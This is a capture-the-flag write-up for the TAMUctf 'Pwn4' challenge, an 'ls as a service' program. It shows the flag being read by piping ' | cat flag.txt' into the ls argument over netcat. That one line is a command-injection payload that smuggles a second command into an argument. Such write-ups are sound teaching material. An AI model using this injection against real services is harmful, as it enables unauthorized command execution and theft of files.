# Pwn4
Pwn, 100 points

## Description:

A binary file was attached, in addition to an address and port.

## Solution:

Let's run the binary:

```console
root@kali:/media/sf_CTFs/tamu/Pwn4# nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
-al
Result of ls -al:
total 20
drwxr-xr-x 1 root    root    4096 Feb 19 20:47 .
drwxr-xr-x 1 root    root    4096 Mar 14 21:45 ..
-r--r--r-- 1 pwnflag pwnflag   23 Feb 19 17:28 flag.txt
-rwsr-xr-x 1 pwnflag pwnflag 7504 Feb 19 17:28 pwn4
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
```

This service accepts parameters to be passed on to `ls` and provides us with the output.

The most trivial experiment to perform is to pass it a pipe to another command:

```console
root@kali:/media/sf_CTFs/tamu/Pwn4# echo " | cat flag.txt" | nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
Result of ls  | cat flag.txt:
gigem{5y573m_0v3rfl0w}
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
^C
```

The flag is easily outputted without a need to analyze the binary.